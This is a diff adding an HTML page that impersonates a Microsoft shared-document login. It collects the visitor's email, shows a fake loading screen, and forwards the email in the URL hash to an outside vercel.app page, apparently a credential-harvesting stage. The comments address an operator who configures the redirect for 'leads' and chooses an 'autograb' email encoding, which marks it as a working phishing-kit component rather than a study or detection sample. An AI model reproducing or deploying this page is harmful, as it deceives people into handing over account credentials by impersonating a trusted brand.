@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #fff url('https://i.ibb.co/fGBBg19Q/download.jpg') no-repeat center center/cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+            transition: background-color 0.5s ease;
+        }
+
+        body.loading {
+            background: #217346;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 80px;
+            margin: 0 auto 1.5rem;
+            display: block;
+            max-width: 100%;
+        }
+
+        h5 {
+            color: #333;
+            margin-bottom: 1.5rem;
+            line-height: 1.4;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #555;
+            text-align: left;
+            font-weight: 500;
+        }
+
+        input[type="email"],
+        input[type="text"] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        input[type="email"]:focus,
+        input[type="text"]:focus {
+            outline: 2px solid #217346;
+            border-color: transparent;
+        }
+
+        .error-border {
+            border-color: red !important;
+        }
+
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: #217346;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #1c3b2f;
+        }
+
+        button:disabled {
+            background: #6c9c7a;
+            cursor: not-allowed;
+        }
+
+        #error-message {
+            color: red;
+            margin-top: 1rem;
+            display: none;
+            font-size: 0.9rem;
+        }
+
+        /* Loading Screen Styles */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #217346;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            color: white;
+        }
+
+        .loading-logo {
+            width: 100px;
+            margin-bottom: 2rem;
+            filter: brightness(0) invert(1);
+        }
+
+        .loading-text {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            color: white;
+        }
+
+        .progress-container {
+            width: 300px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: white;
+            border-radius: 3px;
+            transition: width 2.5s ease-in-out;
+        }
+
+        .loading-email {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================ -->
+    <!-- CONFIGURATION SECTION - SET YOUR SETTINGS HERE -->
+    <!-- ============================================ -->
+    
+    <!-- 
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║  REDIRECT LINK CONFIGURATION                                      ║
+    ║  Set the URL where leads will be redirected after entering email  ║
+    ║  The email will be automatically appended as a hash (#email)      ║
+    ╚══════════════════════════════════════════════════════════════════╝
+    
+    AUTOGRAB COMMAND OPTIONS:
+    ────────────────────────────────────────────────────────────────────
+    1. PLAIN EMAIL:   page.html#user@example.com
+    2. BASE64 EMAIL:  page.html#dXNlckBleGFtcGxlLmNvbQ==
+    3. URL ENCODED:   page.html#user%40example.com
+    
+    Set autograbMode below to: "plain", "base64", or "urlencoded"
+    -->
+    
+    <input type="hidden" id="redirectLink" value="https://balyters-vaelts.vercel.app/natyus.html">
+    <!-- ▲▲▲ SET YOUR REDIRECT LINK ABOVE ▲▲▲ -->
+    <!-- Example: value="https://yourdomain.com/excelautograb.html" -->
+    <!-- Example: value="https://yourdomain.com/excel.html" -->
+    
+    <input type="hidden" id="autograbMode" value="plain">
+    <!-- ▲▲▲ SET YOUR AUTOGRAB MODE ABOVE ▲▲▲ -->
+    <!-- Options: "plain" | "base64" | "urlencoded" -->
+
+    <!-- ============================================ -->
+    <!-- END CONFIGURATION SECTION -->
+    <!-- ============================================ -->
+
+    <!-- Login Form -->
+    <div class="login-container" id="loginContainer">
+        <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="logo">
+        <h5>Enter your Email Address<br>to view the shared "Document"</h5>
+        <form id="emailForm">
+            <div class="form-group">
+                <label for="emailInput">Email Address</label>
+                <input type="email" id="emailInput" placeholder="Enter your email address" autocomplete="email">
+            </div>
+            <button type="submit" id="continueBtn">Continue</button>
+            <div id="error-message">Please enter a valid email address</div>
+        </form>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="loading-logo">
+            <div class="loading-text">Preparing your document...</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="loading-email" id="loadingEmail"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // COVER PAGE WITH REDIRECT & AUTOGRAB
+        // ============================================
+
+        /**
+         * Validates email format
+         * @param {string} email - Email to validate
+         * @returns {boolean} - True if valid
+         */
+        const validateEmail = (email) => {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        };
+
+        /**
+         * Encodes email based on autograb mode
+         * @param {string} email - Email to encode
+         * @param {string} mode - Encoding mode (plain, base64, urlencoded)
+         * @returns {string} - Encoded email
+         */
+        const encodeEmail = (email, mode) => {
+            switch (mode) {
+                case 'base64':
+                    return btoa(unescape(encodeURIComponent(email)));
+                case 'urlencoded':
+                    return encodeURIComponent(email);
+                case 'plain':
+                default:
+                    return email;
+            }
+        };
+
+        /**
+         * Builds the final redirect URL with autograb
+         * @param {string} email - User's email
+         * @returns {string} - Complete redirect URL
+         */
+        const buildRedirectURL = (email) => {
+            const baseLink = document.getElementById('redirectLink').value;
+            const autograbMode = document.getElementById('autograbMode').value;
+            
+            // Encode email based on mode
+            const encodedEmail = encodeEmail(email, autograbMode);
+            
+            // Build final URL with hash autograb
+            // Format: baseLink#encodedEmail
+            return `${baseLink}#${encodedEmail}`;
+        };
+
+        /**
+         * Shows loading screen and starts progress
+         * @param {string} email - Email to display
+         */
+        const showLoadingScreen = (email) => {
+            const loginContainer = document.getElementById('loginContainer');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const progressBar = document.getElementById('progressBar');
+            const loadingEmail = document.getElementById('loadingEmail');
+            
+            // Hide login, show loading
+            loginContainer.style.display = 'none';
+            loadingScreen.classList.add('active');
+            loadingEmail.textContent = email;
+            
+            // Start progress bar animation
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 100);
+        };
+
+        /**
+         * Performs the redirect
+         * @param {string} email - User's email
+         */
+        const performRedirect = (email) => {
+            const redirectURL = buildRedirectURL(email);
+            window.location.href = redirectURL;
+        };
+
+        // Handle Enter key on email input
+        document.getElementById('emailInput').addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                document.getElementById('emailForm').dispatchEvent(new Event('submit'));
+            }
+        });
+
+        // Handle form submission
+        document.getElementById('emailForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const emailInput = document.getElementById('emailInput');
+            const errorMessage = document.getElementById('error-message');
+            const email = emailInput.value.trim();
+            
+            // Clear previous errors
+            emailInput.classList.remove('error-border');
+            errorMessage.style.display = 'none';
+            
+            // Validate email
+            if (!email || !validateEmail(email)) {
+                emailInput.classList.add('error-border');
+                errorMessage.style.display = 'block';
+                emailInput.focus();
+                return;
+            }
+            
+            // Disable button to prevent double submission
+            document.getElementById('continueBtn').disabled = true;
+            
+            // Show loading screen
+            showLoadingScreen(email);
+            
+            // Redirect after progress bar completes (2.5s animation + 0.5s buffer)
+            setTimeout(() => {
+                performRedirect(email);
+            }, 3000);
+        });
+
+        // Auto-focus email input on page load
+        window.addEventListener('load', () => {
+            document.getElementById('emailInput').focus();
+        });
+    </script>
+</body>
+</html>
+
